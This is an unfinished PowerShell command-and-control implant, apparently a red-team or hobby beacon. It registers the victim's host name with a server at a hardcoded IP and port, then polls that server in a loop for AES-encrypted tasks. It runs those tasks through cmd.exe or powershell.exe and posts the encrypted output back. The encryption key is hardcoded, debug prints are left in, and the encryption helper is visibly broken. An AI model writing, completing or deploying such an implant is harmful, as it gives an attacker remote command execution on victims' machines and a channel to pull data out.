function Create-AesManagedObject($key, $IV) {
    
    $aesManaged           = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode      = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize   = 256
    
    if ($IV) {
        
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        
        else {
            $aesManaged.IV = $IV
        }
    }
    
    if ($key) {
        
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        
        else {
            $aesManaged.Key = $key
        }
    }
    
    $aesManaged
}

function Encrypt($key, $unencryptedString) {
    
    $bytes             = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged        = Create-AesManagedObject $key
    $encryptor         = $aesManaged.CreateEncryptor()
    $encryptedData     = $encryptor.TransformFinalBlock($bytes[1]);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt($key, $encryptedStringWithIV) {
    
    $bytes           = [System.Convert]::FromBase64String($encryptedStringWithIV)
    # $IV              = $bytes[0..15]
    $bytes = [System.Text.Encoding]::ASCII.GetString($bytes)
    $bytes = $bytes.split()
    $IV              = $bytes[0]
    $aesManaged      = Create-AesManagedObject $key $IV
    $decryptor       = $aesManaged.CreateDecryptor();
    Write-Output "Bytes?? --> " $bytes[1]
    $unencryptedData = $decryptor.TransformFinalBlock($bytes[1]);
    $aesManaged.Dispose()
    Write-Output "unencry --> $unencryptedData"
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)

}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    $res = "VALID $stdout`n$stderr"
    $res
}

$ip   = "192.168.0.28"
$port = "9090"
## secrets.token_hex(32)
## secrets.token_urlsafe(32)
$key  = '/Q3XEKeUEipAc8Wl/mR3k4S63nSMnWI06o1KPK0+wGM='
$n    = 5
$name = ""
$code = ""

$hname = [System.Net.Dns]::GetHostName()
$type  = "powershell"
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/beacon/register")
$data  = @{
    name = "$hname" 
    type = "$type"
    }
$res_name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST')
$name = $res_name.Content
$code = $res_name.StatusCode
Write-Output "Initial code --> $code"

### temp!!!
$name = "DpJiDntrEh"


$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")



for (;;){
    
    ### check response NOT existence
    $resp  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET')
    
    $status_code = $resp.StatusCode
    Write-Output "Got status code --> $status_code"

    $task = $resp.Content
        
    if (-Not [string]::IsNullOrEmpty($task)){

        Write-Output "Got task? --> $task"
        
        $task = Decrypt $key $task

        #Write-Output "Got task? --> $task"

        $task = $task.split()
        Write-Output "Got task? --> $task"
        $flag = $task[1]
        Write-Output "Got flag? --> $flag"
        $taskId = $task[2]
        
        if ($flag -eq "VALID"){
            
            $command = $task[3]
            $args = $task[4..$task.Length]

            if ($command -eq "shell"){
                
                write-output "entering cmd.exe menu"
            
                $f    = "cmd.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg

                Write-Output "Got the result --> $res"

                $res  = Encrypt $key $res

                Write-Output "Got the encrypted result --> $res"

                $data = @{result = "$res"}

                $resultl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){
            
                $f    = "powershell.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt $key $res
                $data = @{result = "$res"}
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "sleep"){

                $n    = [int]$args[0]
                $data = @{result = ""}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "rename"){
                
                $name    = $args[0]
                $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
                $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
            
                $data    = @{result = ""}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "quit"){
                exit
            }
        }
    }
    sleep $n
}